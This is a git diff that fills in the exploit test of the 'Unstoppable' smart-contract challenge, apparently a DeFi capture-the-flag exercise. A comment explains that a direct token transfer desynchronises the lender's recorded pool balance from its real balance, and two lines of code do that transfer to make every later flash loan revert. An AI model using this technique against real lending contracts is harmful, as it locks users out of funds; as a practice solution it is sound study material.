@@ -39,7 +39,13 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT
+            The vulnerability lies in the assertion (line 40, UnstoppableLender.sol) which can be set to always fail as the 'poolBalance' only gets updated in the
+            'depositToken' function. This means that any additional tokens sent to the contract through other means will not be reflected by the 'poolBalance' and
+            cause a difference in value, reverting all the subsequent calls to 'flashLoan'.
+        */
+        const TokenAttackerInstance = this.token.connect(attacker);
+        await TokenAttackerInstance.transfer(this.pool.address, ethers.utils.parseEther('1'));
     });
 
     after(async function () {
